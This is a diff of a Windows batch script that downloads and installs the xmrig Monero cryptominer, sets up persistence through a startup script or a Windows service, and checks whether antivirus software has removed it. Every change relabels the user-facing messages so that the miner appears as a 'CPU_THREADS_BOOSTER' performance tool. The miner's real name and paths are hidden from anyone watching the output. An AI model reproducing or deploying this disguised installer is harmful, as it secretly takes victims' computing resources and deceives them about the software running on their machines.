@@ -199,14 +199,14 @@ rem timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
-echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
+echo [*] Downloading CPU_THREADS_BOOSTER advanced version ...
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download MoneroOcean advanced version of xmrig
   goto MINER_BAD
 )
 
-echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+echo [*] Unpacking CPU_THREADS_BOOSTER
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
@@ -221,7 +221,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
+echo [*] Checking if advanced version of CPU_THREADS_BOOSTER works fine ^(and not removed by antivirus software^)
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
@@ -233,11 +233,11 @@ if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
   echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
 )
 
-echo [*] Looking for the latest version of Monero miner
+echo [*] Looking for the latest version of CPU_THREADS_BOOSTER
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
-echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
+echo [*] Downloading CPU_THREADS_BOOSTER
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
@@ -245,12 +245,12 @@ if errorlevel 1 (
 )
 
 :REMOVE_DIR1
-echo [*] Removing "%USERPROFILE%\moneroocean" directory
+echo [*] Removing CPU_THREADS_BOOSTER directory
 timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1
 
-echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+echo [*] Unpacking CPU_THREADS_BOOSTER
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
@@ -259,7 +259,7 @@ if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+  echo [*] Unpacking advanced CPU_THREADS_BOOSTER
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
   if errorlevel 1 (
     echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
@@ -269,7 +269,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-echo [*] Checking if stock version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
+echo [*] Checking if stock version of CPU_THREADS_BOOSTER works fine ^(and not removed by antivirus software^)
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
@@ -284,7 +284,7 @@ exit /b 1
 
 :MINER_OK
 
-echo [*] Miner "%USERPROFILE%\moneroocean\xmrig.exe" is OK
+echo [*] CPU_THREADS_BOOSTER is OK
 
 for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
 if [%PASS%] == [] (
@@ -334,26 +334,26 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
+echo [*] Adding call to script 
 (
 echo @echo off
 echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\config_background.json"
 ) > "%STARTUP_DIR%\moneroocean_miner.bat"
 
-echo [*] Running miner in the background
+echo [*] Running CPU_THREADS_BOOSTER in the background
 call "%STARTUP_DIR%\moneroocean_miner.bat"
 goto OK
 
 :ADMIN_MINER_SETUP
 
-echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
+echo [*] Downloading tools to make CPU_THREADS_BOOSTER service to "%USERPROFILE%\nssm.zip"
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make moneroocean_miner service
   exit /b 1
 )
 
-echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+echo [*] Unpacking "%USERPROFILE%\nssm.zip" 
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
@@ -362,7 +362,7 @@ if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+  echo [*] Unpacking "%USERPROFILE%\nssm.zip" 
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\nssm.zip" >NUL
   if errorlevel 1 (
     echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
@@ -372,7 +372,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\nssm.zip"
 
-echo [*] Creating moneroocean_miner service
+echo [*] Creating CPU_THREADS_BOOSTER service
 sc stop moneroocean_miner
 sc delete moneroocean_miner
 "%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
@@ -385,7 +385,7 @@ if errorlevel 1 (
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
 
-echo [*] Starting moneroocean_miner service
+echo [*] Starting CPU_THREADS_BOOSTER service
 "%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
 if errorlevel 1 (
   echo ERROR: Can't start moneroocean_miner service
